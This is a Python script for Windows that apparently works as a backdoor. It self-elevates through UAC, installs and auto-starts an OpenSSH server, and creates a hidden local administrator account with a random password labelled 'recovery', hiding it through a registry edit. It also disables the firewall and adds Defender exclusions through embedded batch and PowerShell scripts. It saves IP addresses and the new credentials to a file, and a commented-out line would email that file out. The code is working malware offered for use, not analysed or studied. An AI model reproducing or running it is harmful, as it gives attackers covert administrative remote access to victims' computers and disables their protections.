import ctypes
import subprocess
import os
from random import choice
from string import ascii_letters
import sys

def rgen():
    return "".join(choice(ascii_letters) for _ in range(choice(range(5,15))))

START_DIR = os.getcwd()
APP_DATA = os.path.abspath(os.environ.get("appdata", "."))
RUN_PATH = os.path.abspath(os.environ.get("appdata", ".") + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup")
TEMP_PATH = os.path.abspath(os.environ.get("temp", "."))
WORK_DIR = os.path.abspath(TEMP_PATH + f"\\{rgen()}")
LIP,EIP1,EIP2 = [0,0,0]
try:
    LIP = subprocess.check_output("powershell (Get-NetIPAddress -AddressFamily IPv4 -InterfaceAlias Ethernet).IPAddress", text=True)
    EIP1 = subprocess.check_output("powershell Invoke-RestMethod -Uri ('http://ipinfo.io/'+(Invoke-WebRequest -UseBasicParsing -uri 'http://ifconfig.me/ip').Content)", text=True)
    EIP2 = subprocess.check_output("powershell (Invoke-WebRequest -Uri 'http://icanhazip.com/').Content", text=True)
except subprocess.CalledProcessError:
    pass
except Exception as exc:
    print(exc)
EMAIL = "test@example.com"
EPWD = "12345"
LUSER = rgen()
LPWD = rgen() + rgen() + rgen()
os.environ["LUSER"] = LUSER
CFILE = f"{WORK_DIR}\\new.cfg"
VSCRIPT = f"{WORK_DIR}\\{rgen()}.vbs"
VSCRIPT_CONTENTS = """
Set wshell = WScript.CreateObject("WScript.Shell")
WScript.Sleep 1000
wshell.SendKeys "{LEFT}"
wshell.SendKeys "{ENTER}"
WScript.Sleep 500
wshell.SendKeys "{LEFT}"
wshell.SendKeys "{ENTER}"
WScript.Sleep 2000
wshell.SendKeys "{LEFT}"
wshell.SendKeys "{ENTER}"
WScript.Sleep 500
wshell.SendKeys "{LEFT}"
wshell.SendKeys "{ENTER}"
WScript.Sleep 1000
wshell.SendKeys "{LEFT}"
wshell.SendKeys "{ENTER}"
WScript.Sleep 500
wshell.SendKeys "{LEFT}"
wshell.SendKeys "{ENTER}"
WScript.Sleep 2000
wshell.SendKeys "{LEFT}"
wshell.SendKeys "{ENTER}"
WScript.Sleep 500
wshell.SendKeys "{LEFT}"
wshell.SendKeys "{ENTER}",
"""
RFILE = f"{WORK_DIR}\\{rgen()}.reg"
RFILE_CONTENTS = ["Windows Registry Editor Version 5.00\n","\n","[HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\WinLogon\\SpecialAccounts\\UserList]\n", f'"{LUSER}"' + "=dword:00000000;"]
IMANAGER = f"{WORK_DIR}\\{rgen()}.ps1"
IMANAGER_CONTENTS = f"""
Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
Start-Service sshd
Set-Service -Name sshd -StartupType 'Automatic'
New-LocalUser "$env:LUSER" -Password $(ConvertTo-securestring '{LPWD}' -AsPlainText -Force) -FullName "$env:LUSER" -Description "recovery"'
Add-LocalGroupMember -Group "Administrators" -Member "$env:LUSER"
reg import {RFILE}
attrib -h -s -r C:\\Users\\{LUSER}
"""
EXCLUDER = f"{WORK_DIR}\\{rgen()}.cmd"
EXCLUDER_CONTENTS = f"""
@echo off
:: BatchGotAdmin
:-------------------------------------
if "%PROCESSOR_ARCHITECTURE%" EQU "amd64" (
>nul 2>&1 "%SYSTEMROOT%\SysWOW64\cacls.exe" "%SYSTEMROOT%\SysWOW64\config\system"
) else (
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system")
if '\%errorlevel%' NEQ '0' (
    echo Requesting administrative privileges...
    goto UACPrompt
) else ( goto gotAdmin )

:UACPrompt
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    set params= %*
    echo UAC.ShellExecute "cmd.exe", "/c ""%~s0"" %params:"=""%", "", "runas", 1 >> "%temp%\getadmin.vbs"

    "%temp%\getadmin.vbs"
    del "%temp%\getadmin.vbs"
    exit /B

:gotAdmin
    pushd "%CD%"
    CD /D "%~dp0"

powershell powershell.exe -ep bypass -windowstyle hidden Add-MpPreference -ExclusionPath "{APP_DATA}"; Add-MpPreference -ExclusionPath "{TEMP_PATH}"; Add-MpPreference -ExclusionPath "{WORK_DIR}"
powershell powershell.exe -ep bypass -windowstyle hidden {IMANAGER}
"""

def admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False


def main():
    print(START_DIR)
    print(RUN_PATH)
    print(WORK_DIR)
    print(f"LIP: {LIP}\nEIP1: {EIP1}\nEIP2: {EIP2}")
    try:
        os.rmdir(WORK_DIR)
    except Exception:
        pass
    os.mkdir(WORK_DIR)
    with open(RFILE, "w") as f:
        f.writelines(RFILE_CONTENTS)
    with open(CFILE, "w") as f:
        contents = [str(LIP), str(EIP1), str(EIP2), str(LUSER), str(LPWD)]
        f.writelines(contents)
    os.system("powershell Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0")
    os.system("powershell Start-Service sshd; Set-Service -Name sshd -StartupType 'Automatic'")
    os.system(f'powershell New-LocalUser "$env:LUSER" -Password $(ConvertTo-securestring \'{LPWD}\' -AsPlainText -Force) -FullName "$env:LUSER" -Description "recovery"; Add-LocalGroupMember -Group "Administrators" -Member "$env:LUSER"')
    os.system(f"powershell reg import {RFILE}; attrib -h -s -r C:\\Users\\{LUSER}")
    os.system("netsh firewall set opmode disable")
    os.system("netsh Advfirewall set allprofiles state off")
    #c2 = os.system(f'powershell Send-MailMessage -From {EMAIL} -To {EMAIL} -Subject "$env:UserName" -Attachment {CFILE} -SmtpServer smtp.gmail.com -Port 587 -UseSsl -Credential (New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList {EMAIL}, (ConvertTo-securestring -String {PWORD} -AsPlainText -Force))')
    os.remove(CFILE)
    #os.removedirs(WORK_DIR)
    sys.exit()

if __name__ == "__main__":
    if admin():
        main()
    else:
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)

